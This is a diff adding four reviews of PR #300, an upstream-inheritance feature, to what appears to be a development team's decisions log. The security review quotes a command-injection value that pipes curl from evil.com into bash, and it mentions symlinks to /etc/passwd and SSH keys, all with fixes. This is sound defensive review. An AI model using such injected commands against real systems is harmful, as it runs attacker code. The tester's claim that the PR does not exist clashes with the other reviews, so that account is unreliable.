@@ -890,3 +890,226 @@ OTel metrics tests use a spy-meter pattern: mock `getMeter()` to return a fake m
 - `test/otel-metric-wiring.test.ts` (5 tests)
 - Future OTel metric tests should follow this same pattern.
 
+---
+
+## 2026-02-22: Security Review: PR #300 — Upstream Inheritance
+
+**By:** Baer (Security)
+**Status:** 🛑 BLOCK — Critical finding must be resolved before merge
+
+PR #300 introduces a significant trust boundary expansion. The feature design is sound, but the implementation has a **critical command injection vulnerability** and several high/medium issues that must be addressed.
+
+### Finding 1: Command Injection via execSync — CRITICAL
+
+**File:** `packages/squad-cli/src/cli/commands/upstream.ts`
+**Lines:** ~122, ~186, ~189
+
+The `ref` value from upstream.json is interpolated **unquoted** into shell commands:
+```typescript
+execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...)
+```
+
+A malicious upstream.json entry with `ref: "main; curl evil.com | bash"` executes arbitrary commands. The `source` value is in double quotes but shell double-quotes still allow `$(command)` substitution.
+
+**Fix required:** Use `execFileSync('git', ['clone', '--depth', '1', '--branch', ref, ...])` instead of `execSync` with string interpolation. `execFileSync` bypasses the shell entirely, eliminating injection.
+
+### Finding 2: Arbitrary Filesystem Read — HIGH
+
+**File:** `packages/squad-sdk/src/upstream/resolver.ts`
+
+For `type: 'local'`, the resolver reads from any filesystem path specified in `upstream.json` with zero validation. For `type: 'export'`, it reads and parses any JSON file at any path. Anyone with write access to `upstream.json` can cause the system to read from any local path on the developer's machine.
+
+**Fix required:** Validate that local sources are absolute paths to directories that actually contain `.squad/` or `.ai-team/`. Consider requiring sources to be within a configurable allowlist or requiring explicit user confirmation on first use.
+
+### Finding 3: Symlink Following — MEDIUM
+
+**File:** `packages/squad-sdk/src/upstream/resolver.ts`
+
+`fs.readFileSync` follows symlinks. A local upstream's `.squad/skills/evil/SKILL.md` could be a symlink to `/etc/passwd` or `~/.ssh/id_rsa`. The content would be read into memory and potentially injected into agent prompts.
+
+**Fix recommended:** Use `fs.lstatSync` to check for symlinks before reading, or use `fs.realpathSync` and verify the resolved path stays within the upstream's root directory.
+
+### Finding 4: No User Consent Model — MEDIUM
+
+**Files:** `resolver.ts`, `upstream.ts`
+
+There is no mechanism for a developer to review or approve what upstream sources will be read at session start. If upstream.json is committed to a repo and a developer clones it, the system silently reads from whatever paths are configured.
+
+**Fix recommended:** On first session with a new upstream.json, display the configured sources and require explicit acknowledgment. Store consent in a local (gitignored) file.
+
+### Findings 5-8
+
+Findings 5 (Prompt Injection) — Medium, Finding 6 (Size Limits) — Low, Finding 7 (Git Credential) — Low, Finding 8 (JSON Prototype Pollution) — No Action.
+
+### Required Actions Before Merge
+
+1. **[CRITICAL]** Replace all `execSync` shell string interpolation with `execFileSync` array-based invocation
+2. **[HIGH]** Add input validation for `ref` and `source`
+3. **[MEDIUM]** Add symlink detection in resolver reads
+4. **[MEDIUM]** Add security tests for injection, traversal, and symlink scenarios
+
+**Verdict:** This PR must not merge until findings 1-4 are addressed. The command injection via execSync is CWE-78 (OS Command Injection) and is trivially exploitable by anyone who can edit upstream.json.
+
+---
+
+## 2026-02-22: Code Quality Review: PR #300 — Upstream Inheritance
+
+**By:** Fenster (Core Dev)
+**Status:** ⚠️ APPROVE WITH REQUIRED FIXES — 5 items before merge
+
+Clean architecture, correct SDK/CLI separation, good test coverage. Five items must be fixed before merge.
+
+### Finding 1: Wrong `fatal` function — BUG
+
+**File:** `packages/squad-cli/src/cli/commands/upstream.ts:44`
+
+The command imports `import { error as fatal }` from output.js, but all other CLI commands use `import { fatal } from ../core/errors.js` which throws SquadError. After a "fatal" error, execution continues to the next `if (action === ...)` block instead of stopping.
+
+**Fix required:** Change import to `import { fatal } from '../core/errors.js';` and remove redundant `return;` statements after `fatal()` calls (since `fatal` returns `never`, TypeScript will enforce unreachable code).
+
+### Finding 2: Command not registered in CLI router — MISSING
+
+**File:** `packages/squad-cli/src/cli-entry.ts`
+
+The `upstream` command is not wired into the CLI entry point. Users cannot invoke `squad upstream` — it's dead code. Every other command follows this pattern in cli-entry.ts.
+
+**Fix required:** Add the route to `cli-entry.ts`.
+
+### Finding 3: `execSync` command injection — CRITICAL (confirms Baer)
+
+**File:** `packages/squad-cli/src/cli/commands/upstream.ts:148, 238, 242`
+
+Baer already flagged this. Confirmed: the `ref` value is interpolated unquoted into shell command strings. Must use `execFileSync('git', [...args])` with array-based invocation.
+
+### Finding 4: Test imports use relative source paths — CONVENTION VIOLATION
+
+**Files:** `test/upstream.test.ts:11`, `test/upstream-e2e.test.ts:10-11`
+
+Tests import from `../packages/squad-sdk/src/upstream/resolver.js` instead of `@bradygaster/squad-sdk/upstream`. This violates the test import migration decision (all 56 test files were migrated to package imports).
+
+**Fix required:** Change to `import { resolveUpstreams, buildInheritedContextBlock, buildSessionDisplay } from '@bradygaster/squad-sdk/upstream';`
+
+### Finding 5: `as any` cast in test — MINOR
+
+**File:** `test/upstream-e2e.test.ts:861`
+
+Uses `(org.castingPolicy as any).universe_allowlist`. Should use `as Record<string, unknown>` per strict-mode conventions.
+
+### What's Good
+
+- SDK/CLI separation is correct. Types and resolver in SDK, CLI command in CLI package.
+- SDK barrel export follows existing pattern with `./upstream` subpath entry.
+- `readUpstreamConfig` returns null (not throws), consistent with `readOptionalFile`/`readOptionalJson`.
+- Type definitions are clean: `UpstreamType`, `UpstreamSource`, `UpstreamConfig`, `ResolvedUpstream`.
+- Path handling uses `path.join`/`path.resolve` correctly.
+- Test coverage is thorough: 14 unit tests + E2E hierarchy test.
+
+### Required Actions (5)
+
+1. **[BUG]** Fix `fatal` import from `errors.ts`, remove redundant `return` statements
+2. **[MISSING]** Register `upstream` command in `cli-entry.ts`
+3. **[CRITICAL]** Replace `execSync` with `execFileSync` array args
+4. **[CONVENTION]** Fix test imports to use `@bradygaster/squad-sdk/upstream` package paths
+5. **[MINOR]** Replace `as any` with `as Record<string, unknown>` in test
+
+---
+
+## 2026-02-22: Test Coverage Requirements: PR #300 Upstream Inheritance
+
+**By:** Hockney (Tester)
+**Status:** BLOCKED — Cannot review what doesn't exist
+
+**Finding:** PR #300 does not exist. No pull request, branch, source files, or test files were found in the repository. All referenced artifacts are missing:
+- `packages/squad-sdk/src/upstream/resolver.ts` — not found
+- `packages/squad-cli/src/cli/commands/upstream.ts` — not found
+- `test/upstream.test.ts`, `test/upstream-e2e.test.ts` — not found
+
+**Test Coverage Requirements (for when PR materializes):**
+
+### Unit Tests (resolver.ts — all 8 functions)
+1. **readUpstreamConfig()** — happy path, null, malformed JSON, empty upstreams, missing fields
+2. **findSquadDir()** — test `.squad/` primary and `.ai-team/` fallback
+3. **readSkills()** — empty directory, no SKILL.md files, permission errors, valid skills
+4. **resolveFromExport()** — valid export, invalid/corrupt export, missing file
+5. **resolveUpstreams()** — all source types (local, git, export), mixed sources, one failure doesn't block others
+6. **buildInheritedContextBlock()** — empty, single, multiple upstreams, deduplication
+7. **buildSessionDisplay()** — empty, single, multiple upstreams
+
+### CLI Command Tests (upstream.ts — 228 lines)
+8. **squad upstream add** — valid local path, valid git URL, invalid path, duplicate add
+9. **squad upstream remove** — existing entry, non-existent entry
+10. **squad upstream list** — empty list, populated list, formatting
+11. **squad upstream sync** — fresh sync, incremental sync, unreachable upstream
+
+### Edge Cases (critical)
+12. **Circular references** — repo A → B → A must not infinite loop
+13. **Deep nesting** — 4+ level hierarchy must resolve transitively
+14. **`.ai-team/` fallback** — legacy dir name must resolve
+15. **Unicode/special chars in paths**
+16. **Empty upstream.json** — valid JSON should not error
+17. **Malformed entries** — missing required fields
+
+### E2E Tests
+18. **Transitive inheritance proof** — 3-level test asserts level-3 inherits from level-1
+19. **Temp dir cleanup** — use pattern from resolution.test.ts
+
+### Minimum Counts
+- Unit tests: ≥20
+- E2E tests: ≥5
+- CLI tests: ≥12 (currently 0 — this is a blocking gap)
+
+**Verdict:** BLOCKED. When the PR appears, apply these requirements as the acceptance gate.
+
+---
+
+## 2026-02-22: Architecture Review: PR #300 — Upstream Inheritance
+
+**By:** Keaton (Lead)
+**Status:** REQUEST CHANGES
+
+The upstream inheritance concept is **architecturally sound** — the Org → Team → Repo hierarchy is a real need, the module boundaries are correct (SDK types + resolver, CLI commands), and `.squad/upstream.json` is the right config location. But several issues must be resolved before this merges.
+
+### Required Changes (blocking)
+
+#### 1. Proposal-first workflow violation
+
+Team decision: "Meaningful changes require a proposal in `docs/proposals/` before execution." This is a +1056 line PR adding a new top-level SDK module. No proposal exists. Write the proposal — even retroactively. It forces articulation of scope boundaries, especially how upstream interacts with the coordinator and the existing sharing/export system.
+
+#### 2. Type safety — `castingPolicy: Record<string, unknown>` is unacceptable
+
+Team decision (Edie): strict mode, no loose types. The casting module exports `CastingConfig`, `CastingEntry`, and `CastingUniverse` — real types with real contracts. Using `Record<string, unknown>` for `castingPolicy` in `ResolvedUpstream` breaks the type chain. Import and use the actual casting types.
+
+#### 3. Missing sanitization on inherited content
+
+The existing `sharing/export.ts` sanitizes all outgoing content against `SECRET_PATTERNS`. The upstream resolver reads skills, decisions, wisdom, casting policy, and routing from external repos and injects them into the runtime context. There is no sanitization pass. An upstream repo that accidentally contains a leaked secret would propagate it into every downstream repo's session context. Add sanitization — reuse the existing `SECRET_PATTERNS` from the sharing module.
+
+#### 4. `findSquadDir()` checking `.ai-team/` — resolve the ambiguity
+
+The resolver checks both `.squad/` and `.ai-team/` as valid upstream directories. This creates permanent dual-format support without a documented deprecation path. Either: (a) document that `.ai-team/` is legacy and will be removed with a console warning, or (b) make the fallback order explicit and tested. Don't silently support two directory names forever.
+
+### Strongly Recommended (non-blocking but expected before v1)
+
+#### 5. Coordinator integration path
+
+The PR provides `buildInheritedContextBlock()` and `buildSessionDisplay()` but doesn't wire them into the coordinator. Currently `SquadCoordinator.handleMessage()` uses `SquadConfig` — there's no hook to inject upstream-inherited context into the routing or prompt pipeline. File an issue for the integration point. Without it, the module is library code with no runtime consumer.
+
+#### 6. Live local upstreams — document the trade-off
+
+Local upstreams read "live" from the filesystem (no copy, no snapshot). Git upstreams have an explicit `sync` command. This asymmetry means local upstream changes propagate immediately and silently, while git upstream changes require an explicit action. Document this as an intentional design choice, not an implicit one. Consider adding a `--snapshot` flag for reproducibility.
+
+#### 7. Clarify `type: 'export'` relationship with sharing module
+
+The sharing module already defines `ExportBundle` as the portable format. Is the `export` upstream type reading an `ExportBundle`? If so, the types should reference `ExportBundle` directly. If it's a different format, document the distinction.
+
+### What's Good
+
+- **SDK/CLI split is correct.** Types and resolver in SDK, commands in CLI. One-way dependency. Follows the established pattern perfectly.
+- **`.squad/upstream.json` is the right location.** Consistent with `casting-policy.json`. Structured JSON config in `.squad/`.
+- **Closest-wins conflict resolution is sound.** Predictable, intuitive, matches CSS cascade mental model.
+- **Test coverage is solid.** 14 unit tests + 3-level hierarchy E2E test validates the core use case.
+- **Git caching in `.squad/_upstream_repos/`** follows the "all state in .squad/" rule. Underscore prefix signals internal/generated.
+
+### Summary
+
+The architecture compounds correctly — this makes org-level governance, team-level conventions, and repo-level overrides a natural composition. Fix the four required items and this is a clean merge.
+
